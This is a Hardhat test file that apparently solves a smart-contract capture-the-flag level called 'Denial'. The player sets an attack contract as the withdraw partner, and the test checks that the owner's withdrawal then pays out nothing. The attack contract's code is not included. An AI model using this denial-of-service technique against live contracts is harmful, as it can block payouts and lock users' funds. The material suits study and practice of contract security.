import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { Denial, DenialAttack } from "../typechain-types/contracts/Denial";
import { expect } from "chai";
import { token } from "../typechain-types/@openzeppelin/contracts";

let accounts: Signer[]
let denial: Denial;
let denialAttack: DenialAttack;
var player: Signer;
var owner: Signer;

describe("solutions: denial", () => {
    beforeEach(async () => {
        accounts = await ethers.getSigners();
        denial = await (await ethers.getContractFactory("Denial")).deploy();

        player = accounts[1];
        owner = accounts[0];

        await owner.sendTransaction({
            to: denial.getAddress(),
            value: ethers.parseEther("1")
        });
    })

    it("solves challenge", async () => {
        denialAttack = await (await ethers.getContractFactory("DenialAttack")).deploy();
        await denial.connect(player).setWithdrawPartner(denialAttack.getAddress());

        const provider = ethers.getDefaultProvider();
        const preBalance = await provider.getBalance(owner.getAddress());
        await denial.connect(owner).withdraw()
        expect((await provider.getBalance(owner.getAddress()))).to.be.equal(preBalance);
        // only the player gets their 1 percent
        expect((await denial.contractBalance())).to.be.equal(ethers.parseEther("0.99"));
    })
})